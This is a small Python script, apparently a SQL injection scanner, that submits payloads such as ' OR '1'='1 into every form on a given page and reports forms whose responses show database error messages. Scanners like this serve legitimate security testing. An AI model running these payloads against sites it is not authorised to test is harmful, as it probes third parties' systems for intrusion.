import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup

SQL_PAYLOADS = ["' OR '1'='1", "' OR 1=1 --", "' OR '1'='1' /*"]

def scan_sql_injection(url):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        results = []

        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            form_url = urljoin(url, action)

            for payload in SQL_PAYLOADS:
                data = {input.get('name'): payload for input in inputs if input.get('name')}
                if method == 'post':
                    res = requests.post(form_url, data=data, timeout=10)
                else:
                    res = requests.get(form_url, params=data, timeout=10)

                error_indicators = ["sql syntax", "unclosed quotation", "syntax error"]
                if any(error in res.text.lower() for error in error_indicators):
                    results.append({"form": form_url, "payload": payload, "vulnerable": True})
                    break

        return {"status": "success", "vulnerabilities": results}

    except Exception as e:
        return {"status": "error", "message": str(e)}

# import modules